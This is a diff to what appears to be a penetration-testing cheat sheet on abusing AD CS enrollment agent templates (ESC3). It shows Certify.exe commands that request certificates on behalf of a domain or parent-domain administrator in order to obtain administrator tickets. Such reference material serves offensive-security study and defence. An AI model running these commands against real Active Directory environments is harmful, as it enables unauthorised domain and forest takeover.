@@ -10,7 +10,10 @@ Request an enrollment agent certificate and use it to request cert on behalf of 
 
 * <pre class="language-batch" data-line-numbers><code class="lang-batch">//Request cert for CertificatRequestAgent from target template.
   Certify.exe request /ca:&#x3C;CA-ServerDomain>\&#x3C;CA-Username> /template:&#x3C;target-template-name>
-  //Convert from cert.pem to pfx and use it to request a cert on behalf of DA using target template.
+  //Convert from cert.pem to pfx.
+  //Find another template that has an EKU that allows for domain authentication and has application policy requirement of certificate request agent
+  Certify.exe find
+  Request a cert on behalf of DA using target template.
   Certify.exe request /ca:&#x3C;CA-ServerDomain>\&#x3C;CA-Username> /template:&#x3C;target-template-name> /onbehalfof:&#x3C;domain>\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
   </code></pre>
 * Convert from cert.pem to pfx, request DA TGT
@@ -21,7 +24,10 @@ Request an enrollment agent certificate and use it to request cert on behalf of 
 
 * <pre class="language-batch" data-line-numbers><code class="lang-batch">//Request cert for CertificatRequestAgent from target template.
   Certify.exe request /ca:&#x3C;CA-ServerDomain>\&#x3C;CA-Username> /template:&#x3C;target-template-name>
-  //Convert from cert.pem to pfx and use it to request a cert on behalf of DA using target template.
+  //Convert from cert.pem to pfx.
+  //Find another template that has an EKU that allows for domain authentication and has application policy requirement of certificate request agent.
+  Certify.exe find
+  request a cert on behalf of DA using target template.
   Certify.exe request /ca:&#x3C;CA-ServerDomain>\&#x3C;CA-Username> /template:&#x3C;target-template-name>   /onbehalfof:&#x3C;parent-domain>\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
   </code></pre>
 * Convert from cert.pem to pfx, request EA TGT
